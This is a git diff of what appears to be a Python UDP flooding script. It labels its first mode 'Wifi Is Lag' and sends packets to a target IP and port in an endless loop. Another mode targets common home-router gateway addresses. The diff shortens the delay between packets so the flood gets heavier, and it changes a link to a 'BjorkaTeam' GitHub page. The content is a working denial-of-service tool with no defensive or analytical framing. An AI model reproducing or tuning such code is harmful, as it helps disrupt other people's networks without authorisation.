@@ -43,7 +43,7 @@ if Cmd == 1:
     print("Wifi Is Lag")
     while True:
         sock.sendto(byte, (ip,port))
-        time.sleep(0.05)
+        time.sleep(0.02)
 elif Cmd == 2:
     os.system("clear")
     ip = ("192.168.0.1")or ("192.168.1.1")or ("192.168.2.1")
@@ -60,5 +60,5 @@ elif Cmd == 2:
     if use == 1000000:
         use = 1
 elif Cmd == 0:
-    links = "https://github.com/bjorkateam"
+    links = "http://github.com/BjorkaTeam"
     webbrowser.open(links)
